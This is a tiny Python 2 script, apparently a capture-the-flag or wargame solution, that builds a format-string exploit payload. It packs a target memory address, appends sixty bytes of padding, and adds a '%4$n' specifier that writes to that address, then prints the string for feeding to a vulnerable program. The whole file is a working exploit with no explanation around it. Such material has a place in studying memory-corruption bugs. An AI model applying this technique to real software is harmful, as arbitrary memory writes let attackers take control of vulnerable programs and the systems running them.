import struct

addr = struct.pack("I", 0x0804988c)
padding = "\x41" * 60
write = "%4$n"

print addr + padding + write
